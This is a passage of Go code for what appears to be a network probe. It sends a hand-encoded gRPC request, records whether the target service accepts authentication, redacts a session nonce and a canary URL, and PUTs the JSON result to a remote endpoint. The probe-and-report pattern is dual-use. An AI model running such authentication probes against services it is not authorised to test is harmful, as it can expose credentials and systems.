	if err != nil {
		result.Error = cleanError(err)
		return result
	}
	if len(body) > maximumBody {
		result.Error = "gRPC response too large"
		return result
	}
	result.BodyBytes = len(body)
	digest := sha256.Sum256(body)
	result.BodySHA256 = hex.EncodeToString(digest[:])
	result.GRPCStatus = response.Trailer.Get("Grpc-Status")
	if result.GRPCStatus == "" {
		result.GRPCStatus = response.Header.Get("Grpc-Status")
	}
	result.GRPCMessage = response.Trailer.Get("Grpc-Message")
	if result.GRPCMessage == "" {
		result.GRPCMessage = response.Header.Get("Grpc-Message")
	}
	if decoded, decodeErr := url.QueryUnescape(result.GRPCMessage); decodeErr == nil {
		result.GRPCMessage = decoded
	}
	result.GRPCMessage = strings.ReplaceAll(result.GRPCMessage, sessionNonce, "[session]")
	result.GRPCMessage = strings.ReplaceAll(result.GRPCMessage, bytemanCanaryURL, "[canary-url]")
	if len(result.GRPCMessage) > 1024 {
		result.GRPCMessage = result.GRPCMessage[:1024] + "[truncated]"
	}
	result.Authenticated = result.GRPCStatus == "0"
	return result
}

func appendUvarint(destination []byte, value uint64) []byte {
	var buffer [binary.MaxVarintLen64]byte
	size := binary.PutUvarint(buffer[:], value)
	return append(destination, buffer[:size]...)
}

func appendVarintField(destination []byte, number int, value uint64) []byte {
	destination = appendUvarint(destination, uint64(number<<3))
	return appendUvarint(destination, value)
}

func appendBytesField(destination []byte, number int, value []byte) []byte {
	destination = appendUvarint(destination, uint64(number<<3|2))
	destination = appendUvarint(destination, uint64(len(value)))
	return append(destination, value...)
}

func appendStringField(destination []byte, number int, value string) []byte {
	return appendBytesField(destination, number, []byte(value))
}

func submitResult(endpoint string, result commandResult) error {
	encoded, err := json.Marshal(result)
	if err != nil || len(encoded) > maximumResult {
		return errors.New("result too large")
	}
	ctx, cancel := context.WithTimeout(context.Background(), resultTimeout)
	defer cancel()
	request, err := http.NewRequestWithContext(ctx, http.MethodPut, endpoint, bytes.NewReader(encoded))
	if err != nil {
		return err
	}
	request.Header.Set("User-Agent", probeUserAgent)
	request.Header.Set("Content-Type", "application/json")
	request.Header.Set("X-Codex-Probe-Session", sessionNonce)
	client := &http.Client{
		CheckRedirect: func(_ *http.Request, _ []*http.Request) error { return http.ErrUseLastResponse },
		Timeout:       resultTimeout,
	}
	response, err := client.Do(request)
	if err != nil {
		return err
	}
	defer response.Body.Close()
	_, _ = io.Copy(io.Discard, io.LimitReader(response.Body, 4096))
	if response.StatusCode < 200 || response.StatusCode >= 300 {
		return fmt.Errorf("result rejected with HTTP %d", response.StatusCode)
	}
	return nil
}
